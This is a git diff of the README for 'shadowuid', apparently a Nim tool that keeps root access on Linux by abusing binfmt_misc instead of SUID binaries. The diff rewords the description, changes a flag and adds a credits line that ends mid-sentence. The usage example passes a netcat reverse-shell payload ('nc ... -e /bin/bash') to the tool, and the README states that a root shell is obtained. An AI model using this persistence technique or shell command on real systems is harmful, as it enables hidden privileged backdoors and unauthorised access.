@@ -1,6 +1,6 @@
 <div align=center>
 <img src=./29FE64AD-A0EF-4A23-8FD3-D646071A74C8.png>
-<pre><code><strong>Obtain persistance without using noisy and detectable SUID using <i>binfmt</i> </strong>
+<pre><code><strong>Privileged persistence without using noisy and detectable SUID using <i>binfmt</i> </strong>
 Also a good way to learn Nim and something new
 </code></pre>
 </div>
@@ -15,11 +15,18 @@ And that's all, **root shell** is obtained and process to obtain it again will b
 
 ##### More granular
 
-You can specify which SUID will trigger your payload. And, obviously, you can also custom the payload.
+You can choose which SUID will trigger your payload (`-c`). And, obviously, you can also custom the payload (`--payload`).
 An example:
 ```shell
-./shadowuid -x --command "nc 127.0.0.2 -e /bin/bash"
+./shadowuid -c --command "nc 127.0.0.2 -e /bin/bash"
 ```
 
 
 ## [Understand the trick](TRICK.md)
+
+
+<div align=center>
+<sup>
+All credits goes to <a href= https://github.com/Sentinel-One/shadowsuid/>Dor Dankner</a>, <a href= https://github.com/toffan/binfmt_misc>toffan</a> and 
+</sup>
+</div>
